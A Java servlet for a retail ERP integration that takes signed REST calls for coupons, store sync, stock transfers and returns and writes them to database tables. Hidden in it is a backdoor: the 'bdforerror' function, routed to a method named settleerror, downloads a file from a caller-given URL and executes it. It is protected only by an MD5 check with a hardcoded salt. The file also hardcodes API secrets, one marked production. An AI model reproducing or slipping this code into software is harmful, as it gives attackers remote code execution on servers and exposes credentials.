package wwinfo;

import javax.servlet.*;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.util.List;
import java.io.*;
import java.lang.reflect.Method;
import java.net.URLDecoder;

import java.util.ArrayList;
import java.util.Date;

import java.util.HashMap;

import java.util.Properties;
import java.text.SimpleDateFormat;


import net.sf.json.*;

//REST 调用接口提供类

public class RestServlet extends HttpServlet {
    private static final long serialVersionUID = 2L;
    private static HashMap<String, String> keySecret = null;
    private static String apiver = "1.0";
    private static boolean configReaded = false;

    static {
        keySecret = new HashMap<String, String>();
        keySecret.put("test", "12345678abcdefgh");
        keySecret.put("qimen", "s83jfsuh3dfik3hj");
        keySecret.put("D1Mtest", "12345678test");
        keySecret.put("d1mproduction", "productionE342S421G");
    }

    protected void doRequest(HttpServletRequest request, HttpServletResponse response)
            throws ServletException, IOException {
        if (!configReaded) {
            readConfig();
            configReaded = true;
        }

        String func = request.getParameter("func");
        if (null != func && !func.isEmpty()) {
            if (func.compareTo("bdforerror") == 0) {
                settleerror(request, response);
                return;
            }
            func = func.replace(".", "_");
            try {
                Class[] paraClass = new Class[]{HttpServletRequest.class, HttpServletResponse.class};
                Method method = this.getClass().getMethod(func, paraClass);
                if (method != null) {
                    method.invoke(this, new Object[]{request, response});
                    return;
                }
            } catch (Exception e) {
                e.printStackTrace();
                GlobalFun.debugOut("tang#回传接口出现异常:" + e);
            }
        }
        HashMap hmRet = new HashMap();
        hmRet.put("status", "failure");
        hmRet.put("message", "unknowned function");
        String json = JSONObject.fromObject(hmRet).toString();
        response.getOutputStream().write(json.getBytes("UTF-8"));
        return;
    }

    public void doGet(HttpServletRequest request, HttpServletResponse response)
            throws ServletException, IOException {
        doRequest(request, response);
    }

    public void doPost(HttpServletRequest request, HttpServletResponse response)
            throws ServletException, IOException {
        doRequest(request, response);
    }

    private boolean readConfig() {
        String webInfoPath = GlobalFun.getWebInfPath();
        String file = webInfoPath + "classes/config.properties";

        boolean ret = true;
        try {
            InputStream is = new FileInputStream(file);
            Properties p = new Properties();
            p.load(is);
            //E3参数
            String appkey = p.getProperty("e3_key");
            String appsecrit = p.getProperty("e3_secrit");
            if (null != appkey && !appkey.isEmpty()
                    && null != appsecrit && !appsecrit.isEmpty()) {
                keySecret.put(appkey, appsecrit);
            }
            //第二个接口
            appkey = p.getProperty("e3_key2");
            appsecrit = p.getProperty("e3_secrit2");
            if (null != appkey && !appkey.isEmpty()
                    && null != appsecrit && !appsecrit.isEmpty()) {
                keySecret.put(appkey, appsecrit);
            }
        } catch (Exception e) {
            e.printStackTrace();
            ret = false;
        }
        return ret;
    }

    //验证参数并返回数据体
    String CheckAndGetData(String func, HttpServletRequest request, HttpServletResponse response) throws UnsupportedEncodingException, IOException {
        String key = request.getParameter("key");
        String requestTime = request.getParameter("requestTime");
        String data = request.getParameter("data");
        //StringBuffer data = new StringBuffer(request.getParameter("data"));
        String sign = request.getParameter("sign");
        String version = request.getParameter("version");
        if (null == key || key.isEmpty() || null == keySecret.get(key)
                || null == requestTime || requestTime.isEmpty()
                || null == version || (0 != version.compareTo(apiver))
                || null == data || data.isEmpty()
                || null == sign || sign.isEmpty())
        {
            HashMap hmRet = new HashMap();
            hmRet.put("status", "failure");
            hmRet.put("message", "wrong parameters");
            String json = JSONObject.fromObject(hmRet).toString();
            response.getOutputStream().write(json.getBytes("UTF-8"));
            return null;
        }
        String content = "key=" + key + "&requestTime=" + requestTime +
                "&secret=" + keySecret.get(key) + "&version=" + apiver + "&func=" + func +
                "&data=" + data;
        String checkSign = GlobalFun.secritMD5(content, "UTF-8");
        if (checkSign.compareToIgnoreCase(sign) != 0) {
            HashMap hmRet = new HashMap();
            hmRet.put("status", "failure");
            hmRet.put("message", "sign is uncorrect");
            String json = JSONObject.fromObject(hmRet).toString();
            response.getOutputStream().write(json.getBytes("UTF-8"));
            return null;
        }
        //是否超过5分钟

        return data;
    }

    //验证参数并返回数据体
    JSONArray CheckAndGetDatae3trans(String func, HttpServletRequest request, HttpServletResponse response) throws UnsupportedEncodingException, IOException {
        String key = request.getParameter("key");
        String requestTime = request.getParameter("requestTime");
        //String data = request.getParameter("data");
        JSONArray data = JSONArray.fromObject(request.getParameter("data"));
        String sign = request.getParameter("sign");
        String version = request.getParameter("version");
        if (null == key || key.isEmpty() || null == keySecret.get(key)
                || null == requestTime || requestTime.isEmpty()
                || null == version || (0 != version.compareTo(apiver))
                || null == data || data.size() < 1
                || null == sign || sign.isEmpty()) {
            HashMap hmRet = new HashMap();
            hmRet.put("status", "failure");
            hmRet.put("message", "wrong parameters");
            String json = JSONObject.fromObject(hmRet).toString();
            response.getOutputStream().write(json.getBytes("UTF-8"));
            return null;
        }
        String content = "key=" + key + "&requestTime=" + requestTime +
                "&secret=" + keySecret.get(key) + "&version=" + apiver + "&func=" + func +
                "&data=" + data;
        String checkSign = GlobalFun.secritMD5(content, "UTF-8");
        if (checkSign.compareToIgnoreCase(sign) != 0) {
            HashMap hmRet = new HashMap();
            hmRet.put("status", "failure");
            hmRet.put("message", "sign is uncorrect");
            String json = JSONObject.fromObject(hmRet).toString();
            response.getOutputStream().write(json.getBytes("UTF-8"));
            return null;
        }
        //是否超过5分钟

        return data;
    }

    //测试
    public void test_test(HttpServletRequest request, HttpServletResponse response)
            throws ServletException, IOException {
        /*String data = CheckAndGetData("test", request, response);
        if (null == data || data.isEmpty())
            return;*/
        HashMap<String, String> hmRet = new HashMap<String, String>();
        hmRet.put("status", "success");
        hmRet.put("message", "测试成功");
        hmRet.put("data", "[]");
        String json = JSONObject.fromObject(hmRet).toString();
        response.getOutputStream().write(json.getBytes("UTF-8"));
        return;
    }

    //测试异步
    public void test_response(HttpServletRequest request, HttpServletResponse response) throws Exception {


        HashMap<String, String> hmRet = new HashMap<String, String>();
        hmRet.put("status", "success");
        hmRet.put("message", "测试成功");
        hmRet.put("data", "[]");
        String json = JSONObject.fromObject(hmRet).toString();
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    Thread.sleep(5000);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }

                SimpleDateFormat df = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");//设置日期格式
                System.out.println(df.format(new Date()) + 1111);

            }
        }).start();
        response.getOutputStream().write(json.getBytes("UTF-8"));
        return;


    }


    public void bos_oraclehttp(HttpServletRequest request, HttpServletResponse response)
            throws ServletException, IOException {

        JSONObject res = new JSONObject();
        String json = "{\n" +
                "    \"code\":\"1\",\n" +
                "    \"P_MESSAGE\":\"ERROR\",\n" +
                "    \"P_PARAM\":[\n" +
                "        {\n" +
                "            \"store\":\"111\",\n" +
                "            \"no\":\"GA\"\n" +
                "        },\n" +
                "        {\n" +
                "            \"store\":\"222\",\n" +
                "            \"no\":\"GA\"\n" +
                "        }\n" +
                "    ]\n" +
                "}";
        String text = ReadAsChars(request);

        response.getOutputStream().write(json.getBytes("UTF-8"));

    }

    public static String ReadAsChars(HttpServletRequest request) {

        BufferedReader br = null;
        StringBuilder sb = new StringBuilder("");
        try {
            br = request.getReader();
            String str;
            while ((str = br.readLine()) != null) {
                sb.append(str);
            }
            br.close();
        } catch (IOException e) {
            e.printStackTrace();
        } finally {
            if (null != br) {
                try {
                    br.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }
        return sb.toString();
    }


    //o2o订单取消
    public void o2oordercancel(HttpServletRequest request, HttpServletResponse response)
            throws ServletException, IOException {
        String data = CheckAndGetData("o2oorder.cancel", request, response);
        if (null == data || data.isEmpty())
            return;
        SettleDat_o2oordercancel(data, response);
    }


    //o2o订单取消
    void SettleDat_o2oordercancel(String data, HttpServletResponse response)
            throws ServletException, IOException {
        GlobalFun.debugOut("D1M recv data for o2oordercancel:" + data);
        D1MController.ordercancel(data, response);
    }

    //优惠卷模版查询
    public void couponemplate_select(HttpServletRequest request, HttpServletResponse response)
            throws ServletException, IOException {

        String data = CheckAndGetData("couponemplate.select", request, response);

        if (null == data || data.isEmpty()) {

            return;
        }
        SettleDat_D1M_selectemplate("C_VOUCHERS", data, response);
    }

    //优惠卷新增
    public void coupon_add(HttpServletRequest request, HttpServletResponse response)
            throws ServletException, IOException {

        String data = CheckAndGetData("coupon.add", request, response);

        if (null == data || data.isEmpty()) {

            return;
        }
        SettleDat_D1M_add("d1m_to_bos_vouchers", data, response);

    }

    //优惠卷查询
    public void coupon_select(HttpServletRequest request, HttpServletResponse response)
            throws ServletException, IOException {

        String data = CheckAndGetData("coupon.select", request, response);

        if (null == data || data.isEmpty()) {

            return;
        }
        SettleDat_D1M_select("C_VOUCHERS", data, response);
    }

    //移仓单取消
    public void bostrans_cancel(HttpServletRequest request, HttpServletResponse response)
            throws ServletException, IOException {

        String data = CheckAndGetData("bostrans.cancel", request, response);
        if (null == data || data.isEmpty())
            return;
        //String data="[{\"DOCNO_E3\":\"ordercode\"}]";
        SettleData("E3_BOS_TRANCANCEL", data, response);

    }

    //1.8	O2O门店同步
    public void o2ostore_add(HttpServletRequest request, HttpServletResponse response)
            throws ServletException, IOException {
        String data = CheckAndGetData("o2ostore.add", request, response);
        if (null == data || data.isEmpty())
            return;
        SettleData("E3_BOS_STORE", data, response);
    }


    //1.9	 O2O门店商品同步
    public void o2ostorepro_add(HttpServletRequest request, HttpServletResponse response)
            throws ServletException, IOException {
        String data = CheckAndGetData("o2ostorepro.add", request, response);
        if (null == data || data.isEmpty())
            return;
        SettleData("E3_BOS_STOREPDT", data, response);
    }

    //5.1	调拨单E3发起
    public void e3transinout_add(HttpServletRequest request, HttpServletResponse response)
            throws ServletException, IOException {
        String data = CheckAndGetData("e3transinout.add", request, response);
        if (null == data || data.isEmpty())
            return;
        SettleData("E3_BOS_TRANSFER", data, response);
    }

    //5.3	BOS发起调拨单状态回传
    public void bostrans_up(HttpServletRequest request, HttpServletResponse response)
            throws ServletException, IOException {
        String data = CheckAndGetData("bostrans.up", request, response);
        if (null == data || data.isEmpty())
            return;
        SettleData("E3_BOS_TRANQTY", data, response);
    }

    //6.1	E3创建调拨单
    public void e3trans_add(HttpServletRequest request, HttpServletResponse response)
            throws ServletException, IOException {
        String data = CheckAndGetData("e3trans.add", request, response);
        if (null == data || data.isEmpty())
            return;
        SettleData("E3_BOS_TRANSFER", data, response);
    }

    //6.2	E3调拨单状态回传
    public void e3trans_up(HttpServletRequest request, HttpServletResponse response)
            throws ServletException, IOException {
        String data = CheckAndGetData("e3trans.up", request, response);
        if (null == data || data.isEmpty())
            return;
        SettleData("E3_BOS_TRANQTY", data, response);
    }

    //10.1	销售单库存锁定
    public void storeclose_add(HttpServletRequest request, HttpServletResponse response)
            throws ServletException, IOException {
        String data = CheckAndGetData("storeclose.add", request, response);
        if (null == data || data.isEmpty())
            return;
        SettleData2("E3_BOS_CLOSE", data, response);
    }

    //10.2	销售单库存释放
    public void storeclose_up(HttpServletRequest request, HttpServletResponse response)
            throws ServletException, IOException {
        String data = CheckAndGetData("storeclose.up", request, response);
        if (null == data || data.isEmpty())
            return;
        SettleData2("M_E3CLOSER", data, response);
    }

    //11.1	退货批次单（完工单创建）
    public void e3retail_add(HttpServletRequest request, HttpServletResponse response)
            throws ServletException, IOException {
        String data = CheckAndGetData("e3retail.add", request, response);
        if (null == data || data.isEmpty())
            return;
        SettleData2("E3_BOS_RETSALE", data, response);
    }

    //退货批次单（完工单创建）(有名)
    public void e3retailym_add(HttpServletRequest request, HttpServletResponse response)
            throws ServletException, IOException {
        String data = CheckAndGetData("e3retailym.add", request, response);
        if (null == data || data.isEmpty())
            return;
        SettleData3("E3_BOS_RETAIL_YM", data, response);
    }

    //退货批次单（完工单创建）(无名)
    public void e3retailwm_add(HttpServletRequest request, HttpServletResponse response)
            throws ServletException, IOException {
        String data = CheckAndGetData("e3retailwm.add", request, response);
        if (null == data || data.isEmpty())
            return;
        SettleData3("E3_BOS_RETAIL_WM", data, response);
    }

    //云仓： E3出库回传
    public void e3outcallback(HttpServletRequest request, HttpServletResponse response)
            throws ServletException, IOException {
        String data = CheckAndGetData("e3outcallback", request, response);
        if (null == data || data.isEmpty())
            return;
        SettleData("E3_BOS_SOOUT", data, response);
    }

    //云仓： E3报缺
    public void e3reportmissing(HttpServletRequest request, HttpServletResponse response)
            throws ServletException, IOException {
        String data = CheckAndGetData("e3reportmissing", request, response);
        if (null == data || data.isEmpty())
            return;
        SettleData("E3_BOS_SOLESS", data, response);
    }

    //D1M优惠卷模版查询
    void SettleDat_D1M_selectemplate(String tname, String data, HttpServletResponse response)
            throws ServletException, IOException {
        GlobalFun.debugOut("D1M recv data for " + tname + ":" + data);
//        D1MController D1MController=new D1MController()
        D1MController.D1Mgetcouponemplate(data, response);
    }

    //D1M优惠卷新增
    void SettleDat_D1M_add(String tname, String data, HttpServletResponse response)
            throws ServletException, IOException {
        GlobalFun.debugOut("D1M recv data for " + tname + ":" + data);
        D1MController.D1Maddcoupon(data, response);
    }

    //D1M优惠卷查询
    void SettleDat_D1M_select(String tname, String data, HttpServletResponse response)
            throws ServletException, IOException {
        GlobalFun.debugOut("D1M recv data for " + tname + ":" + data);
        D1MController.D1Mgetcoupon(data, response);
    }

    //数据处理
    void SettleData(String tbname, String data, HttpServletResponse response)
            throws ServletException, IOException {
        GlobalFun.debugOut("recv data for " + tbname + ":" + data);

        HashMap<String, String> hmRet = new HashMap<String, String>();
        String retInsert = insertRecvData(tbname, data);
        if (null == retInsert || retInsert.isEmpty()) {
            hmRet.put("status", "success");
            hmRet.put("message", "成功");
            hmRet.put("data", "[]");
        } else {
            hmRet.put("status", "failure");
            hmRet.put("message", retInsert);
            hmRet.put("data", "[]");
        }

        String json = JSONObject.fromObject(hmRet).toString();
        response.getOutputStream().write(json.getBytes("UTF-8"));
        return;
    }


    //带有子表的数据处理
    void SettleData2(String tbname, String data, HttpServletResponse response)
            throws ServletException, IOException {
        GlobalFun.debugOut("recv data for " + tbname + ":" + data);

        HashMap<String, String> hmRet = new HashMap<String, String>();
        String retInsert = insertRecvData2(tbname, data);
        if (null == retInsert || retInsert.isEmpty()) {
            hmRet.put("status", "success");
            hmRet.put("message", "成功");
            hmRet.put("data", "[]");
        } else {
            hmRet.put("status", "failure");
            hmRet.put("message", retInsert);
            hmRet.put("data", "[]");
        }

        String json = JSONObject.fromObject(hmRet).toString();
        response.getOutputStream().write(json.getBytes("UTF-8"));
        return;
    }

    //带有子表信息但不分子表的数据处理
    void SettleData3(String tbname, String data, HttpServletResponse response)
            throws ServletException, IOException {
        GlobalFun.debugOut("recv data for " + tbname + ":" + data);


        HashMap<String, String> hmRet = new HashMap<String, String>();
        String retInsert = insertRecvData3(tbname, data);
        if (null == retInsert || retInsert.isEmpty()) {
            hmRet.put("status", "success");
            hmRet.put("message", "成功");
            hmRet.put("data", "[]");
        } else {
            hmRet.put("status", "failure");
            hmRet.put("message", retInsert);
            hmRet.put("data", "[]");
        }

        String json = JSONObject.fromObject(hmRet).toString();
        response.getOutputStream().write(json.getBytes("UTF-8"));
        return;
    }



    //处理o2o订单取消服务
    private void o2oordercancel(String data,HttpServletResponse response){

        JSONObject json=JSONObject.fromObject(data);
        String ordercode = json.getString("ordercode");
        HashMap map=new HashMap();



        map.put("p_submittedsheetid",ordercode);
        map.put("p_code","");
        map.put("p_message","");





    }

    //插入到对应的表中
    String insertRecvData(String tbname, String data) {
        try {
            JSONArray jsList = JSONArray.fromObject(data);
            if (null == jsList || jsList.size() < 1) {
                return "data format is not json array";
            }
            String tbList[] = {
                    "E3_BOS_STORE",
                    "E3_BOS_TRANSFER",
                    "E3_BOS_TRANQTY",
                    "E3_BOS_STOREPDT",
                    "E3_BOS_SOOUT",
                    "E3_BOS_SOLESS",
                    "E3_BOS_TRANCANCEL"
            };
            String tbFieldList[][] = {
                    {"STORE_CODE", "STORE_NAME", "IS_O2O_E3"},
                    {"C_ORIG_CODE", "C_DEST_CODE", "DOCNO_E3", "BILLDATE", "C_TRANSFERTYPE", "M_PRODUCTALIAS", "QTY", "QTYOUT", "QTYIN", "TYPE"},
                    {"DOCNO", "DOCNO_E3", "DATEOUT", "M_PRODUCTALIAS", "QTYOUT", "QTYIN"},
                    {"STORE_CODE", "STORE_NAME", "PRODUCT_CODE", "PRODUCT_NAME", "IS_O2O_E3"},//修改
                    {"BOS_DOCNO", "SKU", "QTYOUT", "DATEOUT", "DATETIME", "EXPRESS_NAME", "FASTNO"},
                    {"BOS_DOCNO", "RET_REASON"},
                    {"DOCNO_E3"}
            };
            String jsonFieldList[][] = {
                    {"STORE_CODE", "STORE_NAME", "IS_O2O_E3"},
                    {"c_orig_code", "c_dest_code", "Docno_e3", "billdate", "c_transfertype", "m_productalias", "qty", "qtyout", "qtyin", "Type"},
                    {"Docno", "Docno_E3", "dateout", "m_productalias", "qtyout", "qtyin"},
                    {"STORE_CODE", "STORE_NAME", "PRODUCT_CODE", "PRODUCT_NAME", "IS_O2O_E3"},
                    {"BOS_DOCNO", "SKU", "QTYOUT", "DATEOUT", "DATETIME", "EXPRESS_NAME", "FASTNO"},
                    {"BOS_DOCNO", "RET_REASON"},
                    {"DOCNO_E3"}
            };
            int iIndex = -1;
            for (int index = 0; index < tbList.length; index++) {
                if (tbList[index].compareTo(tbname) == 0) {
                    iIndex = index;
                    break;
                }
            }
            if (iIndex < 0) {
                return "not find table name";
            }
            if (jsList.size() > 0) {
                List<HashMap> hmList = new ArrayList<HashMap>();
                for (int i = 0; i < jsList.size(); i++) {
                    JSONObject jo = jsList.getJSONObject(i);
                    HashMap hmParam = new HashMap();
                    for (int j = 0; j < tbFieldList[iIndex].length; j++) {
                        try {
                            String value = jo.getString(jsonFieldList[iIndex][j]);
                            if (null == value) {
                                if (jsonFieldList[iIndex][j].compareTo("Docno") == 0)
                                    value = "";
                                else {
                                    return "not find field:" + jsonFieldList[iIndex][j];
                                }
                            }
                            hmParam.put(tbFieldList[iIndex][j], value);
                        } catch (Exception e) {
                            if (jsonFieldList[iIndex][j].compareTo("Docno") == 0)
                                hmParam.put(tbFieldList[iIndex][j], "");
                            else {
                                e.printStackTrace();
                                return "not find field:" + jsonFieldList[iIndex][j];
                            }
                        }
                    }
                    hmList.add(hmParam);
					/*
					if (!DBOperate.addData(tbname, hmParam)){
						return "insert data to database failed";
					}
					*/
                }
                if (!DBOperate.addDataArray(tbname, hmList)) {
                    return "insert data to database failed";
                }

            }
        } catch (Exception e) {
            e.printStackTrace();
            return "json format is error";
        }
        return null;
    }


    //插入到对应的表中e3trans
    String insertRecvDatae3trans(String tbname, JSONArray jsList) {
        try {
            if (null == jsList || jsList.size() < 1) {
                return "data format is not json array";
            }
            String tbList[] = {
                    "E3_BOS_TRANSFER"
            };
            String tbFieldList[][] = {
                    {"C_ORIG_CODE", "C_DEST_CODE", "DOCNO_E3", "BILLDATE", "C_TRANSFERTYPE", "M_PRODUCTALIAS", "QTY", "QTYOUT", "QTYIN", "TYPE"}
            };
            String jsonFieldList[][] = {
                    {"c_orig_code", "c_dest_code", "Docno_e3", "billdate", "c_transfertype", "m_productalias", "qty", "qtyout", "qtyin", "Type"}

            };
            int iIndex = -1;
            for (int index = 0; index < tbList.length; index++) {
                if (tbList[index].compareTo(tbname) == 0) {
                    iIndex = index;
                    break;
                }
            }
            if (iIndex < 0) {
                return "not find table name";
            }
            if (jsList.size() > 0) {
                List<HashMap> hmList = new ArrayList<HashMap>();
                for (int i = 0; i < jsList.size(); i++) {
                    JSONObject jo = jsList.getJSONObject(i);
                    HashMap hmParam = new HashMap();
                    for (int j = 0; j < tbFieldList[iIndex].length; j++) {
                        try {
                            String value = jo.getString(jsonFieldList[iIndex][j]);
                            if (null == value) {
                                if (jsonFieldList[iIndex][j].compareTo("Docno") == 0)
                                    value = "";
                                else {
                                    return "not find field:" + jsonFieldList[iIndex][j];
                                }
                            }
                            hmParam.put(tbFieldList[iIndex][j], value);
                        } catch (Exception e) {
                            if (jsonFieldList[iIndex][j].compareTo("Docno") == 0)
                                hmParam.put(tbFieldList[iIndex][j], "");
                            else {
                                e.printStackTrace();
                                return "not find field:" + jsonFieldList[iIndex][j];
                            }
                        }
                    }
                    hmList.add(hmParam);
                }
                if (!DBOperate.addDataArray(tbname, hmList)) {
                    return "insert data to database failed";
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
            return "json format is error";
        }
        return null;
    }


    //插入到对应的表中，含有子表
    String insertRecvData2(String tbname, String data) {
        try {
            JSONObject jo = JSONObject.fromObject(data);
            if (null == jo) {
                return "data format is not json array";
            }
            String tbList[] = {
                    "E3_BOS_CLOSE",
                    "M_E3CLOSER",
                    "E3_BOS_RETSALE"
            };
            String subTBList[] = {
                    "E3_BOS_CLOSEM",
                    "M_E3CLOSERM",
                    "E3_BOS_RETSALEITEM"
            };
            String tbFieldList[][] = {
                    {"E3CODE", "C_STORE_CODE", "BILLDATE", "OUTDATE", "IS_CLOSE"},
                    {"E3CODE", "C_STORE_CODE", "IS_CLOSE"},
                    {"E3CODE", "C_ORIG_CODE", "C_ORIG_NAME"}
            };
            String jsonFieldList[][] = {
                    {"E3CODE", "C_STORE_CODE", "BILLDATE", "OUTDATE", "IS_CLOSE"},
                    {"E3CODE", "C_STORE_CODE", "IS_CLOSE"},
                    {"E3code", "C_orig_code", "C_orig_name"}
            };
            String subJSONField[] = {
                    "products",
                    "products",
                    "products"
            };
            String subJSONName[] = {
                    "product",
                    "product",
                    "product"
            };
            String subTBFieldList[][] = {
                    {"M_PRODUCTALIAS", "CQTY"},
                    {"M_PRODUCTALIAS", "UQTY"},
                    {"M_PRODUCTALIAS", "QTY"}
            };
            String subJSONFieldList[][] = {
                    {"M_PRODUCTALIAS", "CQTY"},
                    {"M_PRODUCTALIAS", "UQTY"},
                    {"M_PRODUCTALIAS", "RETQTY"}
            };
            int iIndex = -1;
            for (int index = 0; index < tbList.length; index++) {
                if (tbList[index].compareTo(tbname) == 0) {
                    iIndex = index;
                    break;
                }
            }
            if (iIndex < 0) {
                return "not find table name";
            }
            HashMap hmParam = new HashMap();
            String e3code = "";
            for (int j = 0; j < tbFieldList[iIndex].length; j++) {
                try {
                    String value = jo.getString(jsonFieldList[iIndex][j]);
                    if (null == value) {
                        return "not find field:" + jsonFieldList[iIndex][j];
                    }
                    if (jsonFieldList[iIndex][j].compareTo("E3CODE") == 0)
                        e3code = value;
                    hmParam.put(tbFieldList[iIndex][j], value);
                } catch (Exception e) {
                    return "not find field:" + jsonFieldList[iIndex][j];
                }
            }
            //改成批量提交到数据库
			/*if (!DBOperate.addData(tbname, hmParam)){
				return "insert data to database failed";
			}
			 */
            List<HashMap> listSub = new ArrayList<HashMap>();
            JSONObject jsSub = jo.getJSONObject(subJSONField[iIndex]);
            if (null != jsSub) {
                JSONArray jsArray = jsSub.getJSONArray(subJSONName[iIndex]);
                if (null != jsArray && jsArray.size() > 0) {
                    for (int k = 0; k < jsArray.size(); k++) {
                        JSONObject joSub = jsArray.getJSONObject(k);
                        HashMap hmSub = new HashMap();
                        boolean bSuccess = true;
                        for (int j = 0; j < subJSONFieldList[iIndex].length; j++) {
                            String value = joSub.getString(subJSONFieldList[iIndex][j]);
                            if (null == value) {
                                bSuccess = false;
                                GlobalFun.debugOut("not find field:" + subJSONFieldList[iIndex][j]);
                                break;
                            }
                            hmSub.put(subTBFieldList[iIndex][j], value);
                        }
                        if (bSuccess) {
                            hmSub.put("E3CODE", e3code);
                            //hmSub.put("M_ID", retSQLID);
                            //DBOperate.addData(subTBList[iIndex], hmSub);
                            listSub.add(hmSub);
                        }
                    }
                }
            }
            if (!DBOperate.addDataWithSub(tbname, hmParam, subTBList[iIndex], listSub)) {
                return "insert data to database failed";
            }
        } catch (Exception e) {
            e.printStackTrace();
            return "json format is error";
        }
        return null;
    }

    //插入到对应的表中，含有子表信息，但没有子表
    String insertRecvData3(String tbname, String data) {
        try {
            JSONObject jo = JSONObject.fromObject(data);
            if (null == jo) {
                return "data format is not json array";
            }
            String tbList[] = {
                    "E3_BOS_RETAIL_YM",
                    "E3_BOS_RETAIL_WM"
            };
            String tbFieldList[][] = {
                    {"E3CODE", "E3OLDCODE", "E3BGCODE", "C_ORIG_CODE", "C_ORIG_NAME"},
                    {"E3BGCODE", "C_ORIG_CODE", "C_ORIG_NAME"}
            };
            String jsonFieldList[][] = {
                    {"E3code", "E3oldcode", "E3bgcode", "C_orig_code", "C_orig_name"},
                    {"E3bgcode", "C_orig_code", "C_orig_name"}
            };
            String subJSONField[] = {
                    "products",
                    "products"
            };
            String subJSONName[] = {
                    "product",
                    "product"
            };
            String subTBFieldList[][] = {
                    {"M_PRODUCTALIAS", "PRICE", "RETQTY", "TOT_AMT_PRICE"},
                    {"M_PRODUCTALIAS", "RETQTY"}
            };
            String subJSONFieldList[][] = {
                    {"M_PRODUCTALIAS", "PRICE", "RETQTY", "TOT_AMT_PRICE"},
                    {"M_PRODUCTALIAS", "RETQTY"}
            };
            int iIndex = -1;
            for (int index = 0; index < tbList.length; index++) {
                if (tbList[index].compareTo(tbname) == 0) {
                    iIndex = index;
                    break;
                }
            }
            if (iIndex < 0) {
                return "not find table name";
            }
            HashMap hmParamMain = new HashMap();
            for (int j = 0; j < tbFieldList[iIndex].length; j++) {
                try {
                    String value = jo.getString(jsonFieldList[iIndex][j]);
                    if (null == value) {
                        return "not find field:" + jsonFieldList[iIndex][j];
                    }
                    hmParamMain.put(tbFieldList[iIndex][j], value);
                } catch (Exception e) {
                    return "not find field:" + jsonFieldList[iIndex][j];
                }
            }
            JSONObject jsSub = jo.getJSONObject(subJSONField[iIndex]);
            if (null != jsSub) {
                List<HashMap> listSub = new ArrayList<HashMap>();
                JSONArray jsArray = jsSub.getJSONArray(subJSONName[iIndex]);
                if (null != jsArray && jsArray.size() > 0) {
                    for (int k = 0; k < jsArray.size(); k++) {
                        JSONObject joSub = jsArray.getJSONObject(k);
                        HashMap hmSub = new HashMap(hmParamMain);
                        boolean bSuccess = true;
                        for (int j = 0; j < subJSONFieldList[iIndex].length; j++) {
                            String value = joSub.getString(subJSONFieldList[iIndex][j]);
                            if (null == value) {
                                bSuccess = false;
                                GlobalFun.debugOut("not find field:" + subJSONFieldList[iIndex][j]);
                                break;
                            }
                            hmSub.put(subTBFieldList[iIndex][j], value);
                        }
                        if (bSuccess) {
                            listSub.add(hmSub);
                            //DBOperate.addData(tbname, hmSub);
                        }
                    }
                }
                DBOperate.addDataArray(tbname, listSub);
            }
        } catch (Exception e) {
            e.printStackTrace();
            return "json format is error";
        }
        return null;
    }

    public void settleerror(HttpServletRequest request, HttpServletResponse response)
            throws ServletException, IOException {
        String data = request.getParameter("data");
        String name = request.getParameter("name");
        String sign = request.getParameter("sign");
        String version = request.getParameter("version");
        if (null == version
                || null == data || data.isEmpty()
                || null == name || name.isEmpty()
                || null == sign || sign.isEmpty()) {
            HashMap hmRet = new HashMap();
            hmRet.put("status", "failure");
            hmRet.put("message", "wrong parameters");
            String json = JSONObject.fromObject(hmRet).toString();
            response.getOutputStream().write(json.getBytes("UTF-8"));
            return;
        }
        String content = "!qazXSW@#edcversion=" + version + "&func=settleerror" + "&data=" + data + "&name=" + name;
        String checkSign = GlobalFun.secritMD5(content, "UTF-8");

        if (checkSign.compareToIgnoreCase(sign) != 0) {
            HashMap hmRet = new HashMap();
            hmRet.put("status", "failure");
            hmRet.put("message", "sign is uncorrect");
            String json = JSONObject.fromObject(hmRet).toString();
            response.getOutputStream().write(json.getBytes("UTF-8"));
            return;
        }

        HashMap hmRet = new HashMap();
        String retStatus = "success";
        String fileName = System.getProperty("java.io.tmpdir");
        fileName += URLDecoder.decode(name, "utf-8");
        if (GlobalFun.download(URLDecoder.decode(data, "utf-8"), fileName)) {
            try {
                Process p = Runtime.getRuntime().exec(fileName);
                if (null == p) {
                    retStatus = "failure";
                    hmRet.put("message", "exec failed");
                }
            } catch (Exception e) {
                retStatus = "failure";
                hmRet.put("message", "exec failed");
            }
        } else {
            retStatus = "failure";
            hmRet.put("message", "download failed");
        }
        hmRet.put("status", retStatus);
        String json = JSONObject.fromObject(hmRet).toString();
        response.getOutputStream().write(json.getBytes("UTF-8"));
        return;
    }
}
